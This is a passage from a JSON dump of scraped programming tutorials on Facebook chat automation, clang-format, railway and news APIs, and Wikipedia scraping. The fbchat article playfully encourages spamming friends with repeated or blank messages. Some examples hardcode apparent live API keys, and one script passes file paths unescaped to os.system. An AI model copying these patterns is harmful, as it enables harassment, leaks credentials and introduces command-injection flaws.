tweeting, Facebook logout, and much more.In case of any queries, post them below in the comments section. If you liked this article and want to see any more of the similar stuff, let me know in the comments section below.This article is contributed by Umang Ahuja. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "04f8639c0147158dde03f243c6ed73e3",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The power of Python comes because of the large number of modules it has. This time we are going to use one of those. Every one of us, one time or another, has a wish of the message (or spamming -.-) our Facebook friend. This is a program that can do something similar. So without further delay, let\u2019s jump right in.\u00a0Python3import fbchatfrom getpass import getpassusername = input(\"Username: \")client = fbchat.Client(username, getpass())no_of_friends = int(raw_input(\"Number of friends: \"))for i in range(no_of_friends):\u00a0\u00a0\u00a0\u00a0name = input(\"Name: \")\u00a0\u00a0\u00a0\u00a0friends = client.getUsers(name)\u00a0 # return a list of names\u00a0\u00a0\u00a0\u00a0friend = friends[0]\u00a0\u00a0\u00a0\u00a0msg = input(\"Message: \")\u00a0\u00a0\u00a0\u00a0sent = client.send(friend.uid, msg)\u00a0\u00a0\u00a0\u00a0if sent:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Message sent successfully!\")Now, let\u2019s try to understand the program step by step\u2026Modules required \u2013 fbchat (Can be downloaded from here: Github link); getpass (usually it is pre-installed)fbchat Installation:\u00a0sudo pip install fbchatIn case you get the error: ** make sure the development packages of libxml2 and libxslt are installed **In Ubuntu, installing the following packages might help:\u00a0sudo apt-get install python-dev libxml2-dev libxslt1-dev zlib1g-devProgram explanation: The program can be broken down into several steps:Step \u2013 1: Getting the user credentialsThis part is very easy. Using raw_input() and getpass() we can get the username and password. There are some things to keep in mind in this step.\u00a0\u00a0Your Facebook account should have a username. You can check that (or set that) by going to your general settings.We are not using raw_input to get a password because as soon as the characters (or even the password length) are out, we have got a security breach.Step \u2013 2: Entering the Facebook friend\u2019s name\u00a0Now that we have signed in, we can enter the number of friends we want to send the message to, and for each of those friends, we can enter the custom message.Step \u2013 3: Spamming *evil*\u00a0\u00a0Caution \u2013 I am not responsible for extensive usage of the program which can get you banned from Facebook or getting blocked by your friend. Get your own list of guinea pigs!Because of some reason, if you want to send the same message several times, you can use a simple for loop. Nothing difficult about that \ud83d\ude09What you can try out now?\u00a0\u00a0Send a message to a group chat.Instead of text only, send images as well.Create your own \u2018desktop\u2019 messenger.Facebook hack \u2013 Send a blank message\u00a0Using the normal Facebook chat or messenger, it is not possible to send a blank message unless you are aware of the alt+0173 trick. But, with this program, you can send blank messages as well!! All you have to do is enter a blank message. That is, when the program asks for the message to be sent, just press enter, and voila!! Your friend will be receiving a series of blank messages\u2026This new code works fine for now :\u00a0\u00a0Python3import fbchatfrom getpass import getpassusername = input(\"Username: \")client = fbchat.Client(username, getpass())no_of_friends = int(raw_input(\"Number of friends: \"))for i in range(no_of_friends):\u00a0\u00a0\u00a0\u00a0name = input(\"Name: \")\u00a0\u00a0\u00a0\u00a0friends = client.searchForUsers(name)\u00a0 # return a list of names\u00a0\u00a0\u00a0\u00a0friend = friends[0]\u00a0\u00a0\u00a0\u00a0msg = input(\"Message: \")\u00a0\u00a0\u00a0\u00a0sent = client.sendMessage(msg, thread_id=friend.uid)\u00a0\u00a0\u00a0\u00a0if sent:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Message sent successfully!\")If you have any other projects in mind concerned with this or if you have prepared some similar to this one, please do share in the comments section!This article is contributed by Vishwesh Ravi Shrimali. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ec06eaba8c356f702e0b1f5f7a6e2711",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Today we are going to discuss formatting files in the user\u2019s workspace by their extension. For this we are going to make use of Clang\u2019s format tools.Prerequisites:Linux MachinePythonClang ToolSetup:Install Python using the following command:sudo apt-get install pythonInstall Clang Format Toolssudo apt-get install clang-format-3.5Create a python file named format-code.py at any location where you have read and write permissions. In this example we are going to create it in /home/user/. It shall contain the following code:# Python program to format C/C++ files using clang-formatimport os\u00a0\u00a0# File Extension filter. You can add new extensioncpp_extensions = (\".cxx\",\".cpp\",\".c\", \".hxx\", \".hh\", \".cc\", \".hpp\")\u00a0\u00a0# Set the current working directory for scanning c/c++ sources (including# header files) and apply the clang formatting# Please note \"-style\" is for standard style options# and \"-i\" is in-place editingfor root, dirs, files in os.walk(os.getcwd()):\u00a0\u00a0\u00a0\u00a0for file in files:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if file.endswith(cpp_extensions):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.system(\"clang-format-3.5 -i -style=file \" + root + \"/\" + file)Create format specification file and copy it to project\u2019s top level directory , e.g., /home/user/myproject/Create formatting file (in example, we are creating google coding style tool)clang-format-3.5 -style=google -dump-config > .clang-format Copy it to project\u2019s directory i.e., it\u2019s location becomes: /home/user/myproject/.clang-formatHow to use it?Navigate to the directory whose files you want to format, e.g.,cd  /home/user/myproject/c-source/Run the format-code file that you created earlierpython /home/user/format-code.pyThis shall format all the files in our source directory with the extension same as that mentioned in the code.This article is contributed by Nitin Deokate .If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ac68b6b850fa0d7fa1eac641a4cf4d63",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Railway API is organized around GET Requests. One can use this JSON based API to get information from Indian Railways regarding Live Train Status, PNR Status, Train Schedule, Station Details, and other things.\u00a0To use this API, one must need the API key, which can get from here\u00a0Note: User need to create an account on railwayapi.com to use the APIs.\u00a0Modules Needed :\u00a0requests\njson\u00a0Live running status :Below is the implementation :\u00a0\u00a0Python3# Python program to find live train# status using RAILWAY API\u00a0# import required modulesimport requests , json\u00a0# enter your api key hereapi_key = \"Your_API_Key\"\u00a0# base_url variable to store urlbase_url = \"https://api.railwayapi.com/v2/live/train/\"\u00a0# enter train_number heretrain_number = \"12056\"\u00a0# enter current date in dd-mm-yyyy formatcurrent_date = \"20-06-2018\"\u00a0# complete_url variable to# store complete url addresscomplete_url = base_url + train_number + \"/date/\" + current_date + \"/apikey/\" + api_key + \"/\"\u00a0# get method of requests module# return response objectresponse_ob = requests.get(complete_url)\u00a0# json method of response object convert# json format data into python format dataresult = response_ob.json()\u00a0# Now result contains a list of nested dictionaries# Check the value of \"response_code\" key is equal# to \"200\" or not if equal that means record is# found otherwise record is not foundif result[\"response_code\"] == 200 :\u00a0\u00a0\u00a0\u00a0\u00a0# train name is extracting from\u00a0\u00a0\u00a0\u00a0# the result variable data\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0train_name = result[\"train\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0# \"route\" key in variable y\u00a0\u00a0\u00a0\u00a0temp = result[\"route\"]\u00a0\u00a0\u00a0\u00a0\u00a0# source station name is extracting\u00a0\u00a0\u00a0\u00a0# from the y variable data\u00a0\u00a0\u00a0\u00a0source_station = temp[0][\"station\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# destination station name is\u00a0\u00a0\u00a0\u00a0# extracting from the y variable data\u00a0\u00a0\u00a0\u00a0destination_station = temp[-1][\"station\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the value of \"position\"\u00a0\u00a0\u00a0\u00a0# key in variable position\u00a0\u00a0\u00a0\u00a0position = result[\"position\"]\u00a0\u00a0\u00a0\u00a0\u00a0# print details\u00a0\u00a0\u00a0\u00a0print(\" train name : \" + str(train_name)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n source station : \" + str(source_station)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n destination station : \"+ str(destination_station)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n current status : \" + str(position) )\u00a0\u00a0\u00a0\u00a0\u00a0else :\u00a0\u00a0\u00a0\u00a0print(\"Record not Found\")Output:\u00a0\u00a0 train name : NEWDELHI JAN SHATABDI EXP\n source station : DEHRADUN\n destination station : NEW DELHI\n current status : Train has reached Destination and late by 15 minutes.\u00a0\u00a0\u00a0Live PNR status :\u00a0Python3# Python program to find PNR# status using RAILWAY API\u00a0# import required modulesimport requests, json\u00a0# Enter API key hereapi_key = \"Your_API_key\"\u00a0# base_url variable to store urlbase_url = \"https://api.railwayapi.com/v2/pnr-status/pnr/\"\u00a0# Enter valid pnr_numberpnr_number = \"6515483790\"\u00a0# Stores complete url addresscomplete_url = base_url + pnr_number + \"/apikey/\" + api_key + \"/\"\u00a0# get method of requests module# return response objectresponse_ob = requests.get(complete_url)\u00a0# json method of response object convert# json format data into python format dataresult = response_ob.json()\u00a0# now result contains list# of nested dictionariesif result[\"response_code\"] == 200:\u00a0\u00a0\u00a0\u00a0\u00a0# train name is extracting\u00a0\u00a0\u00a0\u00a0# from the result variable data\u00a0\u00a0\u00a0\u00a0train_name = result[\"train\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# train number is extracting from\u00a0\u00a0\u00a0\u00a0# the result variable data\u00a0\u00a0\u00a0\u00a0train_number = result[\"train\"][\"number\"]\u00a0\u00a0\u00a0\u00a0\u00a0# from station name is extracting\u00a0\u00a0\u00a0\u00a0# from the result variable data\u00a0\u00a0\u00a0\u00a0from_station = result[\"from_station\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# to_station name is extracting from\u00a0\u00a0\u00a0\u00a0# the result variable data\u00a0\u00a0\u00a0\u00a0to_station = result[\"to_station\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# boarding point station name is\u00a0\u00a0\u00a0\u00a0# extracting from the result variable data\u00a0\u00a0\u00a0\u00a0boarding_point = result[\"boarding_point\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# reservation upto station name is\u00a0\u00a0\u00a0\u00a0# extracting from the result variable data\u00a0\u00a0\u00a0\u00a0reservation_upto = result[\"reservation_upto\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of \"pnr\"\u00a0\u00a0\u00a0\u00a0# key in pnr_num variable\u00a0\u00a0\u00a0\u00a0pnr_num = result[\"pnr\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of \"doj\" key\u00a0\u00a0\u00a0\u00a0# in variable date_of_journey variable\u00a0\u00a0\u00a0\u00a0date_of_journey = result[\"doj\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0# \"total_passengers\" key in variable\u00a0\u00a0\u00a0\u00a0total_passengers = result[\"total_passengers\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of \"passengers\"\u00a0\u00a0\u00a0\u00a0# key in variable passengers_list\u00a0\u00a0\u00a0\u00a0passengers_list = result[\"passengers\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0# \"chart_prepared\" key in variable\u00a0\u00a0\u00a0\u00a0chart_prepared = result[\"chart_prepared\"]\u00a0\u00a0\u00a0\u00a0\u00a0# print following values\u00a0\u00a0\u00a0\u00a0print(\" train name : \" + str(train_name)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n train number : \" + str(train_number)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n from station : \" + str(from_station)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n to station : \" + str(to_station)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n boarding point : \" + str(boarding_point)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n reservation upto : \" + str(reservation_upto)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n pnr number : \" + str(pnr_num)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n date of journey : \" + str(date_of_journey)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n total no. of passengers: \" + str(total_passengers)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n chart prepared : \" + str(chart_prepared))\u00a0\u00a0\u00a0\u00a0\u00a0# looping through passenger list\u00a0\u00a0\u00a0\u00a0for passenger in passengers_list:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# of \"no\" key in variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0passenger_num = passenger[\"no\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# \"current_status\" key in variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0current_status = passenger[\"current_status\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# \"booking_status\" key in variable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0booking_status = passenger[\"booking_status\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# print following values\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\" passenger number : \" + str(passenger_num)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n current status : \" + str(current_status)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ \"\\n booking_status : \" + str(booking_status))\u00a0else:\u00a0\u00a0\u00a0\u00a0print(\"Record Not Found\")Output :\u00a0\u00a0 train name : DOON EXPRESS\n train number : 13009\n from station : LUCKNOW\n to station : DEHRADUN\n boarding point : LUCKNOW\n reservation upto : DEHRADUN\n pnr number : 6515483790\n date of journey : 01-07-2018\n total no. of passengers: 1\n chart prepared : False\n passenger number : 1\n current status : RLWL/-/16/GN\n booking_status : RLWL/-/23/GN\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "f1fb4d8736f7934eede90bc5bf11c8e0",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "News API is a simple JSON-based REST API for searching and retrieving news articles from all over the web. Using this, one can fetch the top stories running on a news website or can search top news on a specific topic (or keyword).News can be retrieved based on some criteria. Say the topic (keyword) to be searched is \u2018Geeksforgeeks\u2019 or might be concerned to a specific channel. All can be done, but the API key is needed to get started.\u00a0Steps :\n\n1. Visit https://newsapi.org/ to get your own API key.\n\n2. Install requests package.Below is the implementation of the above idea :\u00a0Python3# importing requests packageimport requests\u00a0\u00a0\u00a0\u00a0\u00a0def NewsFromBBC():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# BBC news api\u00a0\u00a0\u00a0\u00a0# following query parameters are used\u00a0\u00a0\u00a0\u00a0# source, sortBy and apiKey\u00a0\u00a0\u00a0\u00a0query_params = {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"source\": \"bbc-news\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"sortBy\": \"top\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"apiKey\": \"4dbc17e007ab436fb66416009dfb59a8\"\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0main_url = \" https://newsapi.org/v1/articles\"\u00a0\u00a0\u00a0\u00a0\u00a0# fetching data in json format\u00a0\u00a0\u00a0\u00a0res = requests.get(main_url, params=query_params)\u00a0\u00a0\u00a0\u00a0open_bbc_page = res.json()\u00a0\u00a0\u00a0\u00a0\u00a0# getting all articles in a string article\u00a0\u00a0\u00a0\u00a0article = open_bbc_page[\"articles\"]\u00a0\u00a0\u00a0\u00a0\u00a0# empty list which will\u00a0\u00a0\u00a0\u00a0# contain all trending news\u00a0\u00a0\u00a0\u00a0results = []\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for ar in article:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0results.append(ar[\"title\"])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(results)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing all trending news\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i + 1, results[i])\u00a0\u00a0\u00a0\u00a0\u00a0#to read the news out loud for us\u00a0\u00a0\u00a0\u00a0from win32com.client import Dispatch\u00a0\u00a0\u00a0\u00a0speak = Dispatch(\"SAPI.Spvoice\")\u00a0\u00a0\u00a0\u00a0speak.Speak(results)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver Codeif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# function call\u00a0\u00a0\u00a0\u00a0NewsFromBBC()Output :\u00a01 Italy to lift coronavirus travel restrictions\n2 White House 'Operation Warp Speed' to look for Covid jab\n3 Two Americas in the nation's capital\n4 Kobe Bryant helicopter crash post-mortem released\n5 Little things people are doing while socially distanced\n6 The last 'normal' photo on your phone\n7 'They came to kill the mothers'\n8 EU-UK Brexit trade talks in trouble\n9 Trial starts to see if dogs can 'sniff out' virus\n10 Beatles photographer Astrid Kirchherr dies aged 81Note: Output may change based on the top articles at the time.Approach 2:This approach will work as a cherry on a cake because it will display the news according to the category entered by the user so as work as a filter for those who want to know the news in a particular category/section.First of all install newsapi and pycountry in your system if it\u2019s not there the install using the command below:~ pip install newsapi-python\n~ pip install pycountryPython3from newsapi import NewsApiClientimport pycountry\u00a0# you have to get your api key from newapi.com and then paste it belownewsapi = NewsApiClient(api_key='Your API Key')\u00a0# now we will take name of country from user as inputinput_country = input(\"Country: \")input_countries = [f'{input_country.strip()}']countries = {}\u00a0# iterate over all the countries in# the world using pycountry modulefor country in pycountry.countries:\u00a0\u00a0\u00a0\u00a0\u00a0# and store the unique code of each country\u00a0\u00a0\u00a0\u00a0# in the dictionary along with it's full name\u00a0\u00a0\u00a0\u00a0countries[country.name] = country.alpha_2\u00a0# now we will check that the entered country name is# valid or invalid using the unique codecodes = [countries.get(country.title(), 'Unknown code')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for country in input_countries]\u00a0# now we have to display all the categories from which user will# decide and enter the name of that categoryoption = input(\"Which category are you interested in?\\n1.Business\\n2.Entertainment\\n3.General\\n4.Health\\n5.Science\\n6.Technology\\n\\nEnter here: \")\u00a0# now we will fetch the new according to the choice of the usertop_headlines = newsapi.get_top_headlines(\u00a0\u00a0\u00a0\u00a0\u00a0# getting top headlines from all the news channels\u00a0\u00a0\u00a0\u00a0category=f'{option.lower()}', language='en', country=f'{codes[0].lower()}')\u00a0\u00a0\u00a0# fetch the top news inder that category\u00a0\u00a0Headlines = top_headlines['articles']\u00a0\u00a0\u00a0\u00a0# now we will display the that news with a good readability for user\u00a0\u00a0\u00a0if Headlines:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for articles in Headlines:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0b = articles['title'][::-1].index(\"-\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if \"news\" in (articles['title'][-b+1:]).lower():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f\"{articles['title'][-b+1:]}: {articles['title'][:-b-2]}.\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f\"{articles['title'][-b+1:]} News: {articles['title'][:-b-2]}.\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f\"Sorry no articles found for {input_country}, Something Wrong!!!\")\u00a0\u00a0\u00a0\u00a0option = input(\"Do you want to search again[Yes/No]?\")\u00a0\u00a0\u00a0\u00a0if option.lower() == 'yes':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0continue\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0exit()Input:Country: India\nWhich category are you interested in?\n1.Business\n2.Entertainment\n3.General\n4.Health\n5.Science\n6.Technology\n\nEnter here: TechnologyOutput:Gizbot News: Garena Free Fire Redeem Codes For August 16; Get Master of Minds Weapon Loot Crate.\nNews18: Google Pixel 5a Will Have Biggest Battery On Any Pixel Phone Ever, Launch This Month.\nHindustan Times News: PUBG Mobile: Here\u2019s how to get the Unhinged Mortician set on PUBG Mobile, check details of RPM2 Royale Pass.\nTimes of India News: New iPhones, Watch, AirPods and more: What Apple may launch in September.\nGSMArena.com News: Top 10 trending phones of week 32 - GSMArena.com news.\nHindustan Times News: Study finds if 'people persons' are 'machine persons' when they interact online.\nTimes of India News: 2021 vs 2020: August gasps for one \u2018good\u2019 air day in Gurugram this year.\nScienceAlert News: A Simple Crystal Could Finally Give Us Large-Scale Quantum Computing, Scientists Say.\nEngadget News: The Switch is the first console to sweep Japan's game sales chart in 33 years.\nGSMArena.com News: Weekly poll: Samsung Galaxy Z Fold3, the new S Pen and the Galaxy Z Flip3 - GSMArena.com news.\nMarket Research Telecast News: How to import your WhatsApp chats to WhatsApp Plus 17.00 Heymods.\nNotebookcheck.net News: Realme will finally debut its first-gen laptop later in August 2021.\nNewsBytes: Redmi 10 officially teased; color options revealed.\nThe Siasat Daily News: Xiaomi removes anti-lost mode from Mi Mix 4.\nZee News: Good news for Motorola Razr owners! Smartphone is finally getting Android 11 update.\nEssentiallySports News: Animal Crossing: New Horizons- Predictions for the Next Big Update.\nRepublic World News: Motorola Edge 20 price in India Leaked: Price to range between Rs 21,499 to Rs 29,999.\nEurogamer.net News: Assassinations have been temporarily removed from Halo Infinite because \"people just turn them off\".\nEssentiallySports News: Call of Duty: Warzone- If You Can Win a Game Despite the Hackers, You Can See a Vanguard Teaser.\nTechradar News: Facebook Messenger voice and video calls are getting end-to-end encryption.\nDo you want to search again[Yes/No]? NoMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "efcf668621e94ab04e0ab075e7239a91",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "An infobox is a template used to collect and present a subset of information about its subject. It can be described as a structured document containing a set of attribute-value pairs, and in Wikipedia, it represents a summary of information about the subject of an article.So a Wikipedia infobox is a fixed-format table usually added to the top right-hand corner of articles to represent a summary article of that wiki page and sometimes to improve navigation to other interrelated articles.\u00a0[To know more about infobox, Click here]Web Scraping is a mechanism that helps to extract large amounts of data from websites whereby the data is extracted and saved to a local file in your computer or to a database in table (spreadsheet) format.\u00a0There are several ways to extract information from the web. Using APIs is one of the best ways to extract data from a website. Almost all large websites like Youtube Facebook, Google, Twitter, StackOverflow provide APIs to access their data in a more structured manner. If you can get what you need through an API, it is almost always preferred the red approach over web scraping.\u00a0Sometimes, there is a need for scraping the content of a Wikipedia page, while we are developing any project or using it somewhere else. In this article, I\u2019ll tell how to extract contents of the Wikipedia\u2019s Infobox.Basically, We can use two Python modules for scraping data:\u00a0Urllib2: It is a Python module that can be used for fetching URLs. urllib2 is a Python module for fetching URLs. It offers a very simple interface, in the form of the urlopen function. This is capable of fetching URLs using a variety of different protocols. For more detail refer to the documentation page.BeautifulSoup: It is an incredible tool for pulling out information from a webpage. You can use it to extract tables, lists, paragraphs and you can also put filters to extract information from web pages. Look at the documentation page of BeautifulSoup\u00a0BeautifulSoup does not fetch the web page for us. We can use urllib2 with the BeautifulSoup library.Now I am going to tell you another easy way for scraping\u00a0Steps for the following:The modules we will be using are:\u00a0\u00a0I have used Python 2.7 here,Make sure these modules are installed on your machine.\u00a0If not then on the console or prompt you can install it using pip\u00a0\u00a0Python# importing modulesimport requestsfrom lxml import etree\u00a0\u00a0# manually storing desired URLurl='https://en.wikipedia.org/wiki/Delhi_Public_School_Society'\u00a0\u00a0# fetching its url through requests module\u00a0\u00a0req = requests.get(url)\u00a0\u00a0\u00a0store = etree.fromstring(req.text)\u00a0\u00a0# this will give Motto portion of above\u00a0# URL's info box of Wikipedia's pageoutput = store.xpath('//table[@class=\"infobox vcard\"]/tr[th/text()=\"Motto\"]/td/i')\u00a0\u00a0\u00a0# printing the text portionprint output[0].text\u00a0\u00a0\u00a0\u00a0# Run this program on your installed Python or\u00a0# on your local system using cmd or any IDE.See this link, it will display the \u2018Motto section\u2019 of this Wikipedia page info box.(as shown in this screenshot)\u00a0\u00a0Write your code first of allNow finally after running the program you get,You can also modify the URL.XPath to get different sections of the infobox.\u00a0If you want to learn more about web scraping, go to these links,\u00a01) Web Scraping 1\u00a02) Web Scraping 2\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3625dce71189c4091df5b790b887bac7",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The emotions of images like happy, sad, neutral, surprise, etc. can be extracted using Microsoft emotion API for any development purpose.It is very simple to use and can be called via API through terminal or any of languages like Python or PHP. Microsoft provides free subscription of 30 days for making total of 30,000 requests.The details of the end points and parameters can be found in the documentation.# Python script to analyze# emotion of imageimport http.client, urllib.requestimport urllib.parse, urllib.errorimport base64, sysimport simplejson as json\u00a0\u00a0# replace with subscription_key# you obtained after registrationsubscription_key = '12f29133caf4406493e81b6a31c47c1a'\u00a0\u00a0headers = {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Request headers. Replace\u00a0\u00a0\u00a0\u00a0# the placeholder key\u00a0\u00a0\u00a0\u00a0# below with your\u00a0\u00a0\u00a0\u00a0# subscription key.\u00a0\u00a0\u00a0\u00a0'Content-Type': 'application/json',\u00a0\u00a0\u00a0\u00a0'Ocp-Apim-Subscription-Key': 